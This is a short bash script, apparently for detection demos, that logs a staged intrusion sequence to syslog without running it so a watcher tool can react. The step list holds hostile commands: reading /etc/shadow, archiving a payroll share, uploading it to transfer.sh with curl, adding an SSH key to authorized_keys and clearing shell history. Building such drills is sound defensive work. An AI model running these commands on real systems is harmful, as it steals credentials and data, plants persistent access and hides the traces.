#!/usr/bin/env bash
# A rehearsal intrusion for demos: writes the commands an attacker might
# type to the journal under the ark-shell tag, a few seconds apart, without
# running any of them. tools/ark-watch picks them up like real ones.
set -euo pipefail
steps=(
  "whoami"
  "ls -la /srv/shares/payroll"
  "cat /etc/shadow"
  "tar czf /tmp/.p.tgz /srv/shares/payroll"
  "curl -T /tmp/.p.tgz https://transfer.sh/p.tgz"
  "echo 'ssh-ed25519 AAAA... x@y' >> ~/.ssh/authorized_keys"
  "history -c"
)
for s in "${steps[@]}"; do
  logger -t ark-shell -- "$s"
  echo "logged: $s"
  sleep "${DRILL_GAP:-3}"
done
